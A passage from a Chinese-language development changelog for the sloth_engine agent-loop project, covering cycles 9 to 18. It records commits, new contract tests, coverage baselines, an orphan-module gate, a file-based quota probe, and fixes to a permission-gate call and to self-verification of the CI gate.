  `ARCHITECTURE-COVERAGE.md §5` 补记 cycle-9（当轮漏记，属文档完整性回填）+ cycle-10。
  验证：`node scripts/validate-contracts.mjs` → **19 atom / 0 错误 / 0 警告**；`node tests/run-l1-tests.mjs` → **32 passed / 0 failed**。
- **C（19 维复评增量，`docs/design/2026-10-22-cycle10-G56R1-connectivity.md`）**：矩阵 19 行不变（covered 12 / partial 6 / N/A 1），
  变化在 partial 的**质量**：#5 workflow partial→covered（步骤级异常策略已有真实调用点）、#6 agent partial→covered（G-5 闭合）；
  #13 cost 仍 partial（接线已通、**仍缺真实额度源**）；#2 review / #9 net / #11 ops / #14 compliance 四条 low 缺口仍如实登记。
- **D（回环）**：`docs/flow/GRAND-LOOP.md` 唤醒指针刷新（代码 head `cd54ef3`，基线 **1392/74.42**），
  cycle-5→cycle-10 提交链锚 + 下一目标（N-1 接线判据门禁化 / N-2 coze I-1..I-4 候选 / N-3 真实额度源与 R3 soak）。
- 本轮总账：蒸馏 M=N=9 **不变**（本轮为接线轮，无新蒸馏条目）；基线 1368/73.79 → **1392/74.42**（+24 用例；head `cd54ef3`）；
  工作树 clean；`run_gate.py --all` PASS；`scripts/docs_baseline.py` OK。
- 全过声明（D11）：本轮**无遗留阻塞、无执行错误**；R2（每项目沙箱，用户裁定不做）、R3（真实模型 / 24h soak，需 LLM 挂载主机）、
  WebUI 与 `guardian/risk_assessor.py::llm_review()`（用户裁定不动）仍如实登记、未绕过（§0.1#6）。

### 13.36 cycle-11 A/B/C/D: N-1 无调用方机制门禁 + N-2 coze 复评纠错 + N-3 接口约定 - 2026-10-22
- **A（N-1 门禁化，commit `81f0b46`，5 files / +381/-1 / +13 用例）**：把 §13.35 登记的「机制已落、接线未闭」
  判据从**人工 `git grep`** 升级为**可执行门禁**：
  * 新增 `scripts/check_orphan_mechanisms.py`：候选 = `sloth_engine/*.py` 顶层且"像机制"（≥1 顶层 `def`/`async def`/`class`，
    故 `_strip_bom.py` 这类工具脚本自动排除）；边 = AST 静态导入（BOM 容错）+ `import_module("x")`/`__import__("x")`
    字面量 + 生产代码引号字面量（配置驱动动态加载兜底）；判定 `wired` / `test_only`（informational）/ `orphan`（FAIL）；
    `EXEMPT` 白名单每项须附理由 + 追踪项，且**陈旧豁免**（模块消失或已接线）同样 FAIL；扫描器自身源码排除（防白名单自遮蔽）。
  * 接入 `scripts/run_gate.py`（与 docs-baseline 并列，fail-closed）。
  * **首次运行命中 2 处真实 orphan**：① `sloth_engine/loop_pipeline.py`（0 调用方的被取代死代码 → `git mv` 归档到
    `sloth_engine/_archive/` + ARCHIVED 头；其 `BackpressureQueue`/`CircuitBreaker`/`LoopConfig·State·Deps` 与
    `backpressure.py`/`circuit_breaker.py`/`run_state.py` 重复）；② `sloth_engine/tool_concurrency.py`（P1-1 批量调度机制，
    OODA `Act` 每轮只 `registry.dispatch(exec_type, ...)` 一个工具 → 无批量生产者 → **显式豁免**，追踪 N-2/I-2）。
  * 附带修 **I-1**：`sloth_engine/rag_layers.py:1` docstring 未 raw（路径样例里的 `\d` 非法转义告警）→ `r"""`，warnings 归零。
  * 契约测试 `tests/test_orphan_mechanisms_gate.py`（13 例）。
- **B（architect-skills 增量，commit `afcf94e`，该仓 `master`）**：**新增 AGE-20**（无调用方机制门禁：机制模块须有非测试调用方；
  白名单必须显式 + 可判活，陈旧豁免同样失败）；`guide.md` 增原则 19；`SKILL.md` 18→19 条；
  `ARCHITECTURE-COVERAGE.md §5` 记 cycle-11 并**纠错** cycle-9 对 I-2 的口径（当时记"与 `tool_concurrency` 重叠、不采"，
  但该机制自身未接线 → 前提不成立）。验证：`node scripts/validate-contracts.mjs` → 19 atom / 0 错 / 0 警；
  `node tests/run-l1-tests.mjs` → 32 passed。
- **C（N-2：coze I-1..I-4 逐条复评，无新采纳）**：I-1（loop 节点图语义）与 loop 固定 OODA + `max_rounds` 不同构 → candidate-pending；
  **I-2（batch 并发闸门）口径纠错**：不再以"与 `tool_concurrency` 重叠"为由，而是"当前 Act 模型无批量调用点"→ 不采纳 +
  该机制显式豁免；I-3（嵌套迭代续跑）与 step checkpoint / `resume_guard` 重叠 → candidate-pending（等真实人工闸门场景）；
  I-4（Redis 中断队列）loop 无 Redis 依赖 → candidate-pending。
  详见 `docs/design/2026-10-22-cycle11-N123-orphan-gate-coze-candidates-quota-contract.md §②`。
- **D（N-3 blocked + 回环）**：G-6 真实额度源 + R3（真实模型调用 / 24h soak）需 LLM 挂载主机 → **登记 blocked**（不绕过），
  并给出 `quota_probe()` 完整接口约定（raw `{primary,secondary}` JSON 形状 + 双口径字段名 + fail-soft 契约 +
  建议"文件型探针"为下一刀）；`docs/flow/GRAND-LOOP.md` 唤醒指针刷新（代码 head `81f0b46`，基线 **1405/75.06**）+ 提交链锚。
- 本轮总账：蒸馏 M=N=9 **不变**（本轮为门禁/评估轮）；基线 1392/74.42 → **1405/75.06**（+13 用例；312 行死代码 `loop_pipeline.py`
  归档离场使覆盖率分母收缩）；工作树 clean；`run_gate.py --all` PASS；`scripts/docs_baseline.py` OK；`check_orphan_mechanisms.py` OK。
- 全过声明（D11）：本轮**无遗留阻塞**（N-3 为环境受限 blocked、已附解封路径）；R2（每项目沙箱，用户裁定不做）、
  WebUI 与 `guardian/risk_assessor.py::llm_review()`（用户裁定不动）仍如实登记、未绕过（§0.1#6）。

### 13.37 cycle-12 A/B/C/D: WeKnora 重叠感知保守文本拼接（条目 10）+ RAG-09 + 19 维增量复评 - 2026-10-22
- **A（四新源蒸馏，commit `26633e3`，3 files / +236/-8 / +16 用例）**：扫描 4 个新源，落 **1 条 adopted（条目 10）**，
  余 3 candidate + 1 reference + 5 candidate-pending（C6..C10）。四源均无 `.git`（压缩包快照）→ 阶段0 记 provisional。
  * **adopted 条目 10（Tencent/WeKnora → `agent-orchestration`）**：重叠感知的保守文本拼接 —— 包含折叠 + 有界重叠去除 +
    短串不判包含 + 保守回退。真值 `internal/searchutil/chunkmerge.go`（266 行）：`JoinChunkContent`@15-45 /
    `ContainsChunkContent`@50-58（`len([]rune(contained)) >= minOverlapRunes`）/ 常量 `minOverlapRunes=12`@90、`defaultSearchSpan=400`@93 /
    `MergeTextChunks`@178-227；同目录 `chunkmerge_test.go` 181 行 ×6 `func Test`。
    反向样本：loop `rag_layers.LayeredMemory._merge_text` 旧实现只做「完全相同去重 + `' ∣ '` 拼接」，对包含/部分重叠无能为力（真缺口）。
    落地：`sloth_engine/text_merge.py`（`contains_text`/`join_adjacent`/`merge_texts` + `MIN_OVERLAP_CHARS=12`/`MAX_OVERLAP_CHARS=400`/
    `DEFAULT_SEPARATOR=" ∣ "`）+ `tests/test_text_merge.py`(16，含接线断言)；`rag_layers.py` 接线 `_merge_text → merge_texts(...)`（`text_merge` 现 wired）。
  * **candidate（provisional，无生产调用点）**：条目 11（cognee 会话持久化增量水位线，与 checkpoint/resume 重叠高）、
    条目 12（Memori 有界延迟批写队列，会改变写入可见性时序、落点未定）、条目 13（WeKnora 关键词分数鲁棒归一化，loop 融合走 RRF → 无调用点）。
  * **reference（DOC-LEVEL，洞5 上限）**：条目 14（ADR 决策记录治理：模板族 + supersede + 决策即代码 fitness function + PR 门禁显式豁免），
    新建 `docs-governance/` 子目录；与 loop N-1 EXEMPT 纪律同构。
  * **candidate-pending（形态不匹配、非否决）**：C6（WeKnora storageurl 双模式 URL）、C7（searchutil 内容签名 + 中文分词 Jaccard）、
    C8（Memori 捕获净化）、C9（Memori augmentation 注册表 + 后台 runtime）、C10（cognee closing_lru_cache）。
  * **总账同步**：`docs/knowledge-distillation/_INDEX.md` 重写为 **N==M==14**（agent-orchestration 11 / data-state 2 / docs-governance 1；
    adopted 8 + candidate 5 + reference 1）；`SOURCE.md` 回填 4 新源；`project-scan-list.md` 加 #9-#12 候选 + C6..C10 漏斗；`README.md` §二 加 `docs-governance/`。
- **B（architect-skills 增量，commit `c960a3d`，该仓 `master`）**：`architect-rag/contract.json` 检查清单 8→9，
  **新增 RAG-09**（重叠感知保守拼接：包含折叠 + `[min,max]` 有界后缀/前缀重叠去除 + 短串不判包含 + 无命中保守回退），
  `output_schema.type` 增 `no_overlap_merge`；`guide.md` 增清单行 + 修复指南「朴素拼接 → 重叠感知的保守合并」（含"为何按偏移裁剪不可靠"：
  零宽改写头 / HTML 实体长度漂移会破坏 `len(content) == EndAt - StartAt`）；`ARCHITECTURE-COVERAGE.md §5` 追加 cycle-12 记录。
  验证：`node scripts/validate-contracts.mjs` → **19 atom / 0 错 / 0 警**；`node tests/run-l1-tests.mjs` → **32 passed**。
- **C（19 维增量复评，`docs/design/2026-10-22-cycle12-C-19dim-increment.md`）**：矩阵 19 行**不变**（同 cycle-10：covered 14 / partial 4 / N/A 1），
  本轮无缺口新闭合、无缺口新增；唯一质量变化在 `rag` 维度检查清单 **8→9**（条目 10 接线已闭，wired）。
- **D（回环）**：`docs/flow/GRAND-LOOP.md` 唤醒指针刷新（代码 head `26633e3`，基线 **1421/75.13**）+ 提交链锚 + 下一目标改写。
- 本轮总账：蒸馏 **M=N=9 → M=N=14**（+5 条目：adopted 1 / candidate 3 / reference 1）；基线 1405/75.06 → **1421/75.13**（+16 用例；head `26633e3`）；
  工作树 clean；`run_gate.py --all` PASS；`scripts/docs_baseline.py` OK；`check_orphan_mechanisms.py` OK（wired 72 / orphan 0 / stale 0，`text_merge.py` 计 100% 覆盖）。
- 全过声明（D11）：本轮**无遗留阻塞、无执行错误**；I-1..I-4（coze）、N-3（真实额度源 + R3 soak，需 LLM 挂载主机）维持原状（blocked，附解封路径）；
  R2（每项目沙箱，用户裁定不做）、WebUI 与 `guardian/risk_assessor.py::llm_review()`（用户裁定不动）仍如实登记、未绕过（§0.1#6）。

### 13.38 cycle-13 A/B/C/D: 文件型额度探针（N-3 feasible slice）+ COS-08 注入面补强 - 2026-10-22
- **A（opt-in 文件型额度探针，commit `c7dad2c`，3 files / +32 用例）**：把 cycle-11 登记 blocked 的 N-3 推进到
  "宿主写一个 JSON 文件即可闭合"——无需任何厂商 SDK，可离线测试，默认档逐字节不变。
  * 新增 `sloth_engine/quota_file_probe.py`：`LOOP_QUOTA_FILE` 指向 JSON 载荷 → 零参探针；`LOOP_QUOTA_PROVIDER`
    （可选）标签；未设/空/纯空白 → OFF（`quota_probe` 保持 `None`）。
    职责刻意切分：**探针只读/解析**（每次调用重新读文件），窗口语义映射与 fail-soft 降级仍归 `quota_window`
    （缺文件/坏 JSON/非对象 → 探针抛错 → `resolve_snapshot` 降级为上次已知快照或 error snapshot，**绝不停机**）。
    provider 标签优先级：`LOOP_QUOTA_PROVIDER` > payload["provider"] > `"loop"`。
  * 接线：`sloth_engine/orchestrator.py::__init__` 尾部 2 行安装（注释 + `_install_quota_file_probe(self)`）——
    满足 N-1 无调用方门禁（生产调用方 = `orchestrator.py`，首次扫描即计入 `wired`）。
  * 新增 `tests/test_quota_file_probe.py`（**32 例**）：env 门控（未设/空/空白）/ 载荷解析（BOM、非对象、坏 JSON、缺文件）/
    provider 优先级 / install 与 no-op（含补齐缺失属性）/ fail-soft 交接 / 门禁消费 / **两条端到端 Orchestrator 跑**：
    env 关 → 3 轮照常（停机原因不含 `Quota`）；env 开 + 耗尽载荷 → **第 0 轮干净停机**（`status=ok`、`total_rounds=0`、
    原因含 `Quota exhausted (provider=file-provider`、`next_reset_at=...`）。
- **B（architect-skills COS-08 补强，commit `90a5287`，该仓 `master`）**：`architect-cost/contract.json` COS-08 trigger 增
  "**来源须可离线注入**（文件探针/环境变量/宿主注入点）且未配置时默认行为逐字节不变（opt-in）；探针只读/取数，
  窗口语义映射与 fail-soft 降级仍归快照层"；`guide.md` 核心原则 5 增 cycle-13 注入补强段 + 检查清单行 +
  新增修复指南「配额来源不可离线验证」（零参探针 / 离线路径 / opt-in 回归断言之"无探针跑 3 轮" / 探针只读 /
  端到端两用例）；`ARCHITECTURE-COVERAGE.md §5` 记 cycle-13 与 loop 反向样本。
  验证：`node scripts/validate-contracts.mjs` → **19 atom / 0 错 / 0 警**；`node tests/run-l1-tests.mjs` → **32 passed**。
  （修复过程一次自伤：新 trigger 文本误用 ASCII 双引号导致 JSON 解析失败 → 立即改为全角引号并复验 0 错，见 `AGENT_ERROR_LOG.md` P-8。）
- **C（19 维增量复评，`docs/design/2026-10-22-cycle13-A-quota-file-probe.md §⑤`）**：矩阵 19 行**不变**
  （covered 14 / partial 4 / N/A 1）；`cost`（#13）仍 partial，但质量推进为"**来源可离线注入**（文件探针），
  真实厂商源仍 blocked"；检查清单 COS-08 补强（非新增 atom，atom 总数维持 19）。
- **D（回环）**：`docs/flow/GRAND-LOOP.md` 唤醒指针刷新（代码 head `c7dad2c`，基线 **1453/75.22**）+ 提交链锚 + 下一目标改写。
- 本轮总账：蒸馏 M=N=14 **不变**（本轮为接线下沉/可用性轮）；基线 1421/75.13 → **1453/75.22**（+32 用例；head `c7dad2c`）；
  工作树 clean；`run_gate.py --all` PASS；`scripts/docs_baseline.py` OK；`check_orphan_mechanisms.py` OK（wired 73 / orphan 0 / stale 0；
  `quota_file_probe.py` 覆盖率 100%）。
- 全过声明（D11）：本轮**无遗留阻塞**；N-3 由 blocked 降级为"宿主侧只差真实厂商源"（文件探针已可用）；
  R3（真实模型调用 / 24h soak）仍 blocked（需 LLM 挂载主机）；I-1..I-4（coze）、条目 11/12/13 candidate-pending 维持原状；
  R2（每项目沙箱，用户裁定不做）、WebUI 与 `guardian/risk_assessor.py::llm_review()`（用户裁定不动）仍如实登记、未绕过（§0.1#6）。

### 13.39 cycle-14 A/B/C/D: 状态历史导出可达化 + 真 JSON（OBS-11） - 2026-10-22
- **A（缺陷修复，commit `a67594e`，4 files / +7 用例）**：闭合 §13.37/§13.38 登记的低优先项「`run_loop.run()` 不可达
  `_state_history` 导出」，并把附带发现的**伪序列化**一并修掉（两条叠加 = 审计导出"纸面存在、运行从不发生、落盘也不可解析"）。
  * **缺陷 1（不可达分支）**：P3-A1 的导出块写在 `run()` 的 `return {...}` **之后** → `StateHistory.to_jsonl` 从未被调用；
    `iter_loop()` 完全没有导出。修复：提取 `_export_state_history()`（无快照时 no-op，返回路径），在 `run()` 返回前与
    `iter_loop()` 收尾处各调用一次。
  * **缺陷 2（伪序列化）**：`immutable_state.StateHistory.to_jsonl` 用 `str(s.to_dict()).replace("'", '"')` 拼"伪 JSON"，
    值含单引号即产出非法行（实测 `json.loads` 报 `Expecting value: line 1 column 160`）。修复：改
    `json.dumps(..., ensure_ascii=False, default=str)`。
  * 新增 `tests/test_state_history_export.py`（**7 例**）：run() 导出逐行可解析且行数 == `_state_history.count`；
    iter_loop() 耗尽后同样导出；0 轮不写空壳；helper 无历史时 no-op；**源侧 tripwire**（导出语句唯一且在 `return` 之前）。
    另在 `tests/test_immutable_state.py` 加 `test_to_jsonl_is_valid_json_even_with_quotes`（单引号 + 中文 → 仍合法 JSON）。
  * 反向样本（修复前实测）：3 轮 run 后 `count==2` 但 work_dir 下**无任何** `state-history-*.jsonl`。
- **B（architect-skills 新增 OBS-11，commit `9ef5c40`，该仓 `master`）**：`architect-observability/contract.json`
  检查清单 10→11，**新增 OBS-11**（审计/状态历史导出必须被端到端断言：产物存在 + 行数 == 内存快照数 + 每行可机器解析 +
  关键字段一致；并显式点名两类"未落地"——**不可达分支**（导出落在 return/raise 之后）与**伪序列化**（str(dict)/repr/
  手写拼接当 JSON））；`guide.md` 增检查清单行 + 口径演进注 + 修复指南「审计导出形同虚设」；`ARCHITECTURE-COVERAGE.md §5`
  记 cycle-14 与 loop 反向样本。验证：`node scripts/validate-contracts.mjs` → **19 atom / 0 错 / 0 警**；
  `node tests/run-l1-tests.mjs` → **32 passed**。
- **C（19 维增量复评，`docs/design/2026-10-22-cycle14-C-state-history-export.md §⑤`）**：矩阵 19 行**不变**
  （covered 14 / partial 4 / N/A 1）；`observability`（#7）质量由"covered 但审计导出实为纸面"推进为
  "**导出可达 + 真 JSON + 端到端断言**"；检查清单 OBS-01..10 → **OBS-01..11**（新增 OBS-11，atom 目录数不变）。
- **D（回环）**：`docs/flow/GRAND-LOOP.md` 唤醒指针刷新（代码 head `a67594e`，基线 **1460/75.76**）+ 提交链锚 + 下一目标改写。
- 本轮总账：蒸馏 M=N=14 **不变**；基线 1453/75.22 → **1460/75.76**（+7 用例；`run_loop.py` 导出路径首次被覆盖，
  覆盖率 +0.54pt）；工作树 clean；`run_gate.py --all` PASS；`scripts/docs_baseline.py` OK；
  `check_orphan_mechanisms.py` OK（wired 73 / orphan 0 / stale 0）。
- 全过声明（D11）：本轮**无遗留阻塞、无执行错误**；N-3 残余（真实厂商源）与 R3（真实模型 / 24h soak）仍 blocked
  （附解封路径）；I-1..I-4（coze）与条目 11/12/13 candidate-pending 维持原状；R2（每项目沙箱，用户裁定不做）、
  WebUI 与 `guardian/risk_assessor.py::llm_review()`（用户裁定不动）仍如实登记、未绕过（§0.1#6）。

### 13.40 cycle-15 A/B/C/D: 14 步工具管线契约（全短路分支）+ OBS-12 - 2026-10-22
- **A（补齐契约，commit `f9049a7`，1 文件 / +25 用例）**：闭合 §13.39 登记的低优先项「`tool_pipeline` 其余 13 步契约测试」。
  * **缺口**：`ToolPipeline.execute()` 的 14 步里，此前只有 step-10（G-5 步异常策略，`tests/test_step_policy_wiring.py`）
    有断言；step1 查无 / step2 abort / step3 schema 拒绝 / step7 前置 hook 抛错 / step8-9 权限拒绝 / step10 回退
    以及 `ToolOrchestrator`、`create_pipeline` 两个适配器**全部无测试**，模块覆盖率仅 **64%**（未覆盖行正是全部短路分支）。
  * **补齐**：新增 `tests/test_tool_pipeline_contract.py`（**25 例**）逐步契约，并把两条安全不变量钉死
    ——**权限拒绝不得被记为 `completed`**、**短路后不得继续执行后续步**（含副作用未发生的断言：拒绝/中止时 handler 未被调用）；
    happy path 另断言 14 步**编号与名称全序完整**。
  * 反向样本（补齐前实测）：只跑 step-policy 用例时覆盖 64%，未覆盖行 `31, 120->122, 123-128, 134-139, 145->155, 149-154,
    165-168, 174-182, 190, 244-246, 254-276, 282`。
  * 结果：`sloth_engine/tool_pipeline.py` **64% → 99%**（仅剩已生效的 sys.path bootstrap 行 31）。
- **B（architect-skills 新增 OBS-12，commit `b2dd73e`，该仓 `master`）**：`architect-observability/contract.json`
  检查清单 11→12，**新增 OBS-12**（多步管线/状态机/执行链的审计记录须覆盖全部短路分支：审计步骤集合恰好止于短路步 +
  短路步 status/detail 可判读 + 终态不为成功 + 副作用未发生；happy path 另断言步骤编号与名称全序完整）；
  `guide.md` 增检查清单行 + 口径演进注 + 修复指南「多步管线的审计只看 happy path」；`ARCHITECTURE-COVERAGE.md §5` 记 cycle-15。
  验证：`node scripts/validate-contracts.mjs` → **19 atom / 0 错 / 0 警**；`node tests/run-l1-tests.mjs` → **32 passed**。
- **C（19 维增量复评，`docs/design/2026-10-22-cycle15-A-tool-pipeline-contract.md §⑤`）**：矩阵 19 行**不变**
  （covered 14 / partial 4 / N/A 1）；`observability`（#7）质量由"导出可达 + 真 JSON"再进一步为
  "**审计覆盖全部短路分支，不只 happy path**"；检查清单 OBS-01..11 → **OBS-01..12**（atom 目录数不变）。
- **D（回环）**：`docs/flow/GRAND-LOOP.md` 唤醒指针刷新（代码 head `f9049a7`，基线 **1485/76.11**）+ 提交链锚 + 下一目标改写。
- 本轮总账：蒸馏 M=N=14 **不变**；基线 1460/75.76 → **1485/76.11**（+25 用例；head `f9049a7`）；工作树 clean；
  `run_gate.py --all` PASS；`scripts/docs_baseline.py` OK；`check_orphan_mechanisms.py` OK（wired 73 / test_only 15 / exempt 1 / orphan 0 / stale 0）。
- 全过声明（D11）：本轮**无遗留阻塞、无执行错误**；N-3 残余（真实厂商源）与 R3（真实模型 / 24h soak）仍 blocked
  （附解封路径）；N-2 残余（coze I-1/I-3/I-4）与 cycle-12 条目 11/12/13 维持 candidate-pending；
  R2（每项目沙箱，用户裁定不做）、WebUI 与 `guardian/risk_assessor.py::llm_review()`（用户裁定不动）
  仍如实登记、未绕过（§0.1#6）；低优先仅剩 `tool_registry.dispatch` 主路径（65%）与 `tool_concurrency`（0%，EXEMPT）。

### 13.41 cycle-16 A/B/C/D: 权限门调用点失效 + 6 个"伪测试"不在门禁内 + TES-11/AGE-21 - 2026-10-23
- **A（缺陷修复，commit `a09421a`，11 files / +57 用例）**：闭合 §13.40 的两项低优先，并在过程中暴露 1 个 P0 级隐藏缺陷。
  * **缺陷 1（权限门调用点漂移，P0）**：`tool_registry.dispatch` 调 `self._permission_gate.check(tool.name, tool.source)`，
    而 `PermissionGate` 只有 `check_tool_call(tool_name, tool_args, *, level=None)` → **任何 `set_permission()` 之后的
    dispatch 必抛 `AttributeError`**，7 级权限门（P3-A3）形同虚设。反样（修复前实测）：
    `set_permission(DEFAULT)` + `dispatch("write_file")` → `AttributeError: 'PermissionGate' object has no attribute 'check'`。
    该分支无测试（模块覆盖 65%）故长期隐藏；同接缝另一处调用（`tool_pipeline` step 8）用的是正确方法且有测试。
    修复：改用 `check_tool_call(tool.name, {"source","args","kwargs"})`（params 构造提前以复用同一形状）。
  * **缺陷 2（伪测试，约 630 行断言不在门禁）**：6 个 `tests/test_*.py` 实为脚本式（`def main()` + `__main__` 守卫、
    零顶层 `def test_*`）：`test_execution_contracts.py` / `test_orchestrator_boundaries.py` / `test_result_contract.py` /
    `test_result_contract_failure_matrix.py` / `test_w0_isolation.py` / `test_wave3_boundaries.py`。
    实测（补齐前）：`pytest tests/test_execution_contracts.py -q` → `no tests ran in 2.15s`。
    修复：各加 `def test_contract(): main()` 薄入口（**body 未改**）；新增 `tests/test_gate_collection_tripwire.py`（2 例，
    AST 扫描 `tests/**/test_*.py`，收集数 = 0 即失败）防复发。
  * **缺陷 3（零覆盖的 EXEMPT 参考实现）**：`tool_concurrency.py` 0% —— 豁免接线 ≠ 免测。
    新增 `tests/test_tool_concurrency_contract.py`（19 例：fail-closed 配置 / 独占屏障切分 / 有界池 / 提交序回填 / 兄弟取消 / 批间中止）。
  * 新增 `tests/test_tool_registry_contract.py`（28 例：注册面 + 权限接缝（含"原缺陷会抛 AttributeError"回归）+ pre-hook +
    单调 guard + handler/post-hook 失败 + hook-bus 事件 + MCP 发现 + 上下文工具策略）。
  * 结果：`tool_registry.py` **65% → 100%**；`tool_concurrency.py` **0% → 100%**。
  * 观察项（如实登记，未改行为）：pre-hook 的改写 params 只替换 guard/审计视图，**不改变交给 handler 的实参**（已按现有语义钉住）。
- **B（architect-skills 双增，commit `006eea4`，该仓 `master`）**：
  * `architect-test` 检查清单 10→11，**新增 TES-11**（测试/契约文件必须被门禁实际收集，收集数 ≠ 0；脚本式伪测试识别 + 薄入口 + 元测试）；
  * `architect-agent` 检查清单 20→21，**新增 AGE-21**（同一协作接缝的多个调用点都须有等价契约断言，防接口重命名漂移）；
    两者均补 `guide.md` 检查清单行/口径演进注（agent 另加 cycle-16 实测增补节 + 原则 20）；`ARCHITECTURE-COVERAGE.md §5` 记 cycle-16。
  * 验证：`node scripts/validate-contracts.mjs` → **19 atom / 0 错 / 0 警**；`node tests/run-l1-tests.mjs` → **32 passed**。
- **C（19 维增量复评 + 用户裁定登记，`docs/design/2026-10-23-cycle16-A-gate-collection-and-permission-seam.md`）**：
  矩阵 19 行**不变**（covered 14 / partial 4 / N/A 1）；`test` 维度 TES-01..10 → **TES-01..11**；
  `agent` 维度 AGE-01..20 → **AGE-01..21**。
- **D（回环 + 裁定落盘）**：
  * **用户裁定（2026-10-23）**：**N-3（真实厂商额度源）/ R3（真实模型调用 · 24h soak）＝ 不做** ——
    仅作文档登记，**不再作为 blocked 项跟踪**（宿主若将来把真实用量写入 JSON，`LOOP_QUOTA_FILE` 探针可零改动接入）。
  * **coze I-1/I-3/I-4 与 cycle-12 条目 11/12/13 ＝ 维持 candidate-pending，无解封条件不启动**
    （解封条件：任意节点图 / 真实人工闸门 / Redis 依赖；O(n²) 全量重放 / 高频小写成瓶颈 / 融合改分数加权）。
  * `docs/flow/GRAND-LOOP.md` 唤醒指针刷新（代码 head `a09421a`，基线 **1542/77.58**）+ 提交链锚 + 下一目标改写为"无待办积压"。
- 本轮总账：蒸馏 M=N=14 **不变**；基线 1485/76.11 → **1542/77.58**（+57 用例；覆盖 +1.47pt；head `a09421a`）；工作树 clean；
  `run_gate.py --all` PASS；`scripts/docs_baseline.py` OK；`check_orphan_mechanisms.py` OK（wired 73 / test_only 15 / exempt 1 / orphan 0 / stale 0）。
- 全过声明（D11）：本轮**无遗留阻塞、无执行错误**（用户已裁定 N-3/R3 不做，故 blocked 项清零）；R2（每项目沙箱）、
  WebUI、`guardian/risk_assessor.py::llm_review()` 维持用户裁定不动，如实登记、未绕过（§0.1#6）。

### 13.42 cycle-17 A/B/C/D: 门禁自证（实测 vs 登记棘轮 + 门禁行为契约 + 收集扫描加固）+ TES-12/TES-13/AGE-22 - 2026-10-23
- **A（缺陷修复，commit `710a3af`，5 files / +46 用例）**：本轮主题"守护者无人守护"，与 cycle-16 同族（都是"看起来有、实际不生效"），但修的是**门禁自己**。
  * **缺陷 1（门禁接线只被源码 grep 守护，high）**：`test_run_gate_invokes_the_orphan_gate` / `test_run_gate_has_all_flag` 的断言只是对
    `scripts/run_gate.py` 做字符串匹配。反样：把 orphan 检查挪到 `return 0` 之后、或删掉棘轮段 → 字符串还在、**全量测试全绿**、门禁静默失效。
    佐证：`git grep "run_gate.main / _triggered / _parse_fail_under"` → **0 命中**（门禁主体从未被执行）；`[tool.coverage.run] source=["sloth_engine"]`
    → `scripts/` **不在覆盖率分母**。修复：新增 `tests/test_gate_self_verification.py`（20 例）——`importlib` 加载门禁、单测纯函数、
    monkeypatch 子进程/git/外部校验器后驱动 `main()`，把每条 fail 路径（未触发 SKIP / 缺依赖 / 棘轮下降 / 测试红灯 / 摘要不可解析 / 文档漂移 /
    orphan / 登记落后 / 全绿 PASS）都变成可复现断言。
  * **缺陷 2（登记基线从不与实测对照，high）**：`docs/baseline.json` 的 passed/coverage 是手抄值；`docs_baseline.check()` 只做"文档 ↔ 登记"互校，
    `run_gate.py` 只看退出码与 `fail_under` → **没有任何环节把登记值与真实运行比对**。失效模式：删一批测试 + 手改登记与 9 个当前态文档 = 全绿
    （`fail_under=70` 与实测 77.57% 间 7.6pt 缓冲足以吸收）。修复：`run_gate.py` 新增 **baseline-vs-measured 单向棘轮**
    （`parse_pytest_summary()` + `baseline_violations()`；捕获 pytest 输出并原样转发）：实测 passed < 登记 → FAIL；实测 coverage < 登记 − 0.15 → FAIL；
    摘要解析失败 → FAIL（fail-closed）；实测高于登记 → 允许。顺手修 `scripts/docs_baseline.py` docstring 的旧口径硬编码（`1196 passed / 72.13%`）。
  * **缺陷 3（收集扫描覆盖不全，medium）**：cycle-16 的 tripwire 用 `glob("test_*.py")`（非递归、只认 `test_` 前缀），而 pytest 默认
    `python_files = test_*.py *_test.py` 且递归收集 → `tests/<sub>/`、`foo_test.py` 可整体绕过，且扫描器自身无测试。
    修复：改 `rglob` + 双命名 + 2 例**扫描器自证**（合成 tmp 树）。
  * 另新增 `tests/test_orchestrator_cli_surface.py`（21 例）：`orchestrator.py` 的 CLI 面（`status/review/_show_history/reset/build_orchestrator/main`）
    此前从未被门禁执行 → 覆盖率 **53% → 86%**。
  * 结果：全量 **1542 → 1588 passed**（+46）；coverage **77.57% → 78.73%**。
- **B（architect-skills 三增，commit `88fa263`，该仓 `master`）**：
  * `architect-test` 检查清单 11→13：**TES-12**（收集扫描须覆盖 pytest 全部可收集命名与深度 + 扫描器自证）；**TES-13**（登记基线数字须与
    **实测运行**对照，单向棘轮；"文档↔登记"互校不等于"登记 == 真实"）。
  * `architect-agent` 检查清单 21→22：**AGE-22**（门禁/守护脚本必须被**行为**验证——import 后跑到每条判定分支，源码 grep 式断言不算验证）；
    并顺手修 `SKILL.md` 摘要表滞后（补原则 20/21，"19条核心原则"→"21条"）。
  * 三者均补 `guide.md` 检查清单行 + 口径演进注 + cycle-17 实测增补节；`ARCHITECTURE-COVERAGE.md §5` 记 cycle-17。
  * 验证：`node scripts/validate-contracts.mjs` → **19 atom / 0 错 / 0 警**；`node tests/run-l1-tests.mjs` → **32 passed**。
- **C（19 维增量复评 + 观察项登记，`docs/design/2026-10-23-cycle17-A-gate-self-verification.md`）**：
  矩阵 19 行**不变**（covered 14 / partial 4 / N/A 1）；`test` 维度 TES-01..11 → **TES-01..13**；`agent` 维度 AGE-01..21 → **AGE-01..22**。
  新观察项：orphan 门禁的 `test_only` 分类会把 **CLI 入口**误记为"参考实现"（本仓 7 个入口中 5 个落在此类），文档口径需谨慎。
- **D（回环 + 裁定落盘）**：`docs/flow/GRAND-LOOP.md` 唤醒指针刷新（代码 head `710a3af`，基线 **1588/78.73**）+ 提交链锚 + 下一目标；
  用户裁定沿用（N-3/R3 不做；coze I-1/I-3/I-4 与 cycle-12 条目 11/12/13 维持 candidate-pending）。
- 本轮总账：基线 1542/77.58 → **1588/78.73**（+46 用例；覆盖 +1.15pt）；工作树 clean；
  `run_gate.py --all` PASS（含新增 `baseline-vs-measured: OK`）；`scripts/docs_baseline.py` OK；
  `check_orphan_mechanisms.py` OK（wired 73 / test_only 15 / exempt 1 / orphan 0 / stale 0）。
- 全过声明（D11）：本轮**无遗留阻塞、无执行错误**；R2（每项目沙箱）、WebUI、`guardian/risk_assessor.py::llm_review()` 维持用户裁定不动，如实登记、未绕过（§0.1#6）。

### 13.43 cycle-18 A/B/C/D: 唤醒指针提交链自证（提交链 vs git 实测）+ TES-14/DOC-06 - 2026-10-23
- **A：缺陷修复（commit `c758387`，2 files / +8 用例）**：同族缺陷的第三处 —— cycle-16 修「被门禁漏掉的测试」、
